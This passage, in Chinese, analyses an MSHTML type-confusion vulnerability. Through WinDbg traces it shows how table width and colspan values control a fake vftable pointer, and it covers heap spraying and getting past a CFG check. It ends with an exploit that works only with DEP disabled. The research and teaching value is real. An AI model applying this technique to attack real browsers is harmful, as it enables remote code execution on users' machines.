    08efb8f4 67e6c0fc 09b778d0 08efbd54 09b409d0 MSHTML!TSmartPointer::operator=+0x13
    08efb940 67e6c03e 090b82f8 09b40900 09b40a20 MSHTML!Layout::SBoxModel::CalculateFullBoxModelForTable+0x9f
    08efb9bc 67b1a3dc 090b82f8 09b40900 09b40a20 MSHTML!Layout::SBoxModel::CalculateFullBoxModel+0x270
    08efbac4 67b12365 08efbd54 0001f400 08efbcec MSHTML!Layout::FlowBoxBuilder::BuildBoxItem+0x25a
到此，我们完成了对FlowBoxBuilder结构体关键成员变量的赋值，这个成员变量会在后续调用中，进入很关键的TableBoxBuilder结构体，我们关键的Array位置存放在FlowBoxBuilder+0x114的指针内偏移为+0xc的指针处，接下来我们进入TableBoxBuilder类函数跟踪。
+0xc的这个Array会在TableBoxBuilder::InitialBoxSizing函数中交给TableBoxBuilder结构体+0x294的位置。
    0:007:x86> p
    MSHTML!Layout::TableBoxBuilder::InitializeBoxSizing+0x5c:
    67e766ac 8d460c          lea     eax,[esi+0Ch]//esi存放的就是FlowBoxBuilder+0x114的指针
    //+0xc位置存放的就是Array结构体
    0:007:x86> p
    MSHTML!Layout::TableBoxBuilder::InitializeBoxSizing+0x5f:
    67e766af 50              push    eax
    0:007:x86> p
    MSHTML!Layout::TableBoxBuilder::InitializeBoxSizing+0x60:
    67e766b0 8d8b94020000    lea     ecx,[ebx+294h]//ebx存放的是TableBoxBuilder+0x294的指针地址
    0:007:x86> p//调用SArray::operator
    MSHTML!Layout::TableBoxBuilder::InitializeBoxSizing+0x66:
    67e766b6 e879e6c4ff      call    MSHTML!SArray::operator= (67ac4d34)//esi+0c
    0:007:x86> dd 0963ba2c//esi+0xc的值
    0963ba2c  00a2beb0 00000000 e0e0e0e0 00000000
    0:007:x86> dd a2beb0
    00a2beb0  00000000 001e84a8 003d0950 005b8df8
    00a2bec0  007a12a0 00989748 a0a0a0a0 a0a0a0a0
在MSHTML!SArray::operator函数中，会完成对TableBoxBuilder+0x294位置的赋值，就是将上面代码中esi+0xc的值，交给TableBoxBuilder+0x294。
    0:007:x86> g
    Breakpoint 4 hit
    MSHTML!SArray::operator=+0x1a:
    67ac4d4e 85c9            test    ecx,ecx
    0:007:x86> dd 09d7ff30+294//偏移294位置存放着TableBoxBuilder中的size部分，用于赋值给Type Confusion的对象
    09d801c4  09d7da30 00000000 e0e0e0e0 00000000
    09d801d4  00000000 a0a0a0a0 a0a0a0a0 09d7f868
    0:007:x86> dd 09d7da30//已经完成了Size的赋值操作
    09d7da30  00000000 001e84a8 003d0950 005b8df8
    09d7da40  007a12a0 00989748 a0a0a0a0 a0a0a0a0
    0:007:x86> kb
    ChildEBP RetAddr  Args to Child              
    08e7b878 67e766bb 09da48bc 08e7bbbc 08e7b8a8 MSHTML!SArray::operator=+0x1a
    08e7b890 67ccb346 051d2fd8 051d2f88 09da48b0 MSHTML!Layout::TableBoxBuilder::InitializeBoxSizing+0x6b
在最后漏洞触发位置的MSHTML!Layout::TableGridBox::InitializeColumnData函数中，会完成对我们漏洞触发位置的Type
Confusion的结构体内容的赋值。
    6912e226 8b8394020000    mov     eax,dword ptr [ebx+294h] ds:002b:0924592c=09245598  //what is ebx and ebx+294  ebx is struct Layout::TableBoxBuilder
    6912e22c 8b0e            mov     ecx,dword ptr [esi]//获取我申请的堆指针
    6912e22e 8b0490          mov     eax,dword ptr [eax+edx*4]//计算TableBoxBuilder对应294位置的值+索引*sizeof
    6912e231 890491          mov     dword ptr [ecx+edx*4],eax//将这个值交给申请堆指针对应索引的位置
    6912e234 42              inc     edx//edx = edx+1//自加1
    6912e235 3bd7            cmp     edx,edi//check lenth 检测是否已经到达我申请的堆大小
    6912e237 7ced            jl      MSHTML!Layout::TableGridBox::InitializeColumnData+0x6c (6912e226)
可能大家这个时候有点乱了，下面我将用一个流程图来展示一下结构体的赋值过程。大致就是首先会通过计算获得Width的一个size，计算方法是:Width*100+200，随后，会将这个值保存在一个Array里，这个Array的大小后面会讲到。之后会将这个Array存入一个指针偏移＋0xc的位置，交给FlowBoxBuilder结构体＋0x114的位置。之后，会赋值给TableBoxBuilder结构体＋0x294位置，最后会交给漏洞触发位置申请的堆指针。
而经过我们上面的分析，产生漏洞的位置在这个Array+0x4位置，我们也需要通过table的条件控制这个位置的值，才能达到利用。
* * *
### 控制Array结构到漏洞利用
通过上面的跟踪，我们知道了id=th1的Table中的Width可以控制一个Array结构，但是我们也发现Array结构并非单独只包含一个Width计算得到的值。
    0:007:x86> dd 9bc7038
    //
    09bc7038  00000000 00004e48 00009c90 0000ead8
    09bc7048  00013920 00018768 a0a0a0a0 a0a0a0a0
可以看到，Array结构是有一个大小的，其实，这个Array中存放的值，取决于width，而大小取决于colspan，这个colspan为5的情况下，Array中存放了5个值，而我们需要控制的是Array+0x4这个位置的值，这样的话，我们将colspan的大小修改为1，并且修改Width的值。
    0:005:x86> t
    MSHTML!Layout::Patchable >::Readable:
    67afecf4 8b15fc5cb368    mov     edx,dword ptr [MSHTML!_tls_index (68b35cfc)] ds:002b:68b35cfc=00000002
    0:005:x86> p
    MSHTML!Layout::Patchable::Readable+0x6:
    67afecfa 64a12c000000    mov     eax,dword ptr fs:[0000002Ch] fs:0053:0000002c=00000000
    0:005:x86> p
    MSHTML!Layout::Patchable::Readable+0xc:
    67afed00 8b0490          mov     eax,dword ptr [eax+edx*4] ds:002b:008f5dd0=008f0fb8
    0:005:x86> dd ecx//ecx存放的是Array
    098563c8  00000000 0c0c0c04 a0a0a0a0 a0a0a0a0
可以看到，通过修改Width和colspan，我们成功控制了Array+0x4位置的值，这样，在接下来由于TypeConfusion，会将这个int
Array当成是vftable pointer返回，并继续执行。
    0:005:x86> p//Layout::Patchable>::Readable函数
    MSHTML!Layout::Patchable::Readable+0x1e:
    67afed16 83c010          add     eax,10h
    0:005:x86> p
    MSHTML!Layout::Patchable::Readable+0x21:
    67afed19 c3              ret
    0:005:x86> p
    MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0x2c3d36://返回之后，eax成功变成了0c0c0c14的值
    683cfc87 833800          cmp     dword ptr [eax],0    ds:002b:0c0c0c14=00000000
可以看到，在返回后，我们可以成功控制这个返回指针了。接下来，我们利用heap spray来喷射堆，从而稳定控制0c0c0c0c位置的值。
* * *
### CFG???从PoC到半个exploit
到此，我们完成了对漏洞函数返回值的控制，在文章最开始的时候，我们看到这个指针的值中的成员变量，会作为虚函数在后续call调用中引用，在此之前，会有一处CFG
check。
    0:007:x86> p//eax已经被我们控制，跳转到喷射结束的堆中
    MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0x2c3d45:
    683cfc96 8b18            mov     ebx,dword ptr [eax]  ds:002b:0c0c0bb0=0c0c0c0c
    0:007:x86> p
    MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0x2c3d47:
    683cfc98 8b03            mov     eax,dword ptr [ebx]  ds:002b:0c0c0c0c=0c0c0c0c
    0:007:x86> p
    MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0x2c3d49:
    683cfc9a 8bb8a4010000    mov     edi,dword ptr [eax+1A4h] ds:002b:0c0c0db0=0c0c0c0c
    0:007:x86> p
    MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0x2c3d4f:
    683cfca0 8bcf            mov     ecx,edi
    0:007:x86> p
    MSHTML!Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement+0x2c3d51:
    683cfca2 ff1534afb568    call    dword ptr [MSHTML!__guard_check_icall_fptr (68b5af34)] ds:002b:68b5af34=67ac4b50//进入CFG check函数
    0:007:x86> t
    MSHTML!CJSProtocol::`vftable'+0xc://对CJSProtocol vftable的值进行检查
    67ac4b50 8bc0            mov     eax,eax
    0:007:x86> p
    MSHTML!CElement::OnGCFilteredForReplacedElem:
    67ac4b52 c3              ret
这也是有疑惑的地方，在这个CFG
check中，会对CJProtocol::`vftable有效性进行检查，但是没有对我们返回值指向的虚函数进行检查，导致我们可以通过这处CFG检查。
但是由于所有地址模块都开启了ASLR，而利用面来看的话，并没有地方可以泄露内存信息，也没有其他好用的利用点，这样的话就不好绕过ASLR和DEP，我在关闭win7
DEP的情况下，完成了利用。
感谢大家阅读，如果有不当之处，请大家多多交流，谢谢！
* * *